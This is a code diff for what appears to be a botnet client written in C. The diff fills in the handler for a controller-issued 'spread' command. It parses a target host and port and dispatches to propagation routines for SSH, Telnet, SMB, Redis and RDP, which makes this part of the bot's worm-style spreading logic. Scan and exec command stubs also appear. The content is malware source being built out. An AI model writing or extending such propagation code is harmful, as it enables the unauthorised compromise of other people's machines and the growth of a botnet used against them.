@@ -597,7 +597,24 @@ int protocol_process_commands(notnet_bot_t *bot) {
         char *cmd = bot->cmd_queue[i];
         
         if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
-            log_info("CMD: spread");
+            char *args = cmd + strlen(CMD_SPREAD);
+            while (*args == ' ' || *args == '\t') args++;
+            /* Parse target:port */
+            char host[256] = {0};
+            uint16_t port = 0;
+            if (sscanf(args, "%255[^:]:%hu", host, &port) == 2) {
+                log_info("CMD: spread %s:%d", host, port);
+                switch (port) {
+                    case 22:  spread_ssh(bot, host, port); break;
+                    case 23:  spread_telnet(bot, host, port); break;
+                    case 445: spread_smb(bot, host, port); break;
+                    case 6379: spread_redis(bot, host, port); break;
+                    case 3389: spread_rdp(bot, host, port); break;
+                    default: log_info("CMD: spread unknown port %d", port); break;
+                }
+            } else {
+                log_info("CMD: spread invalid format, use target:port");
+            }
         } else if (strncmp(cmd, CMD_SCAN, strlen(CMD_SCAN)) == 0) {
             log_info("CMD: scan");
         } else if (strncmp(cmd, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
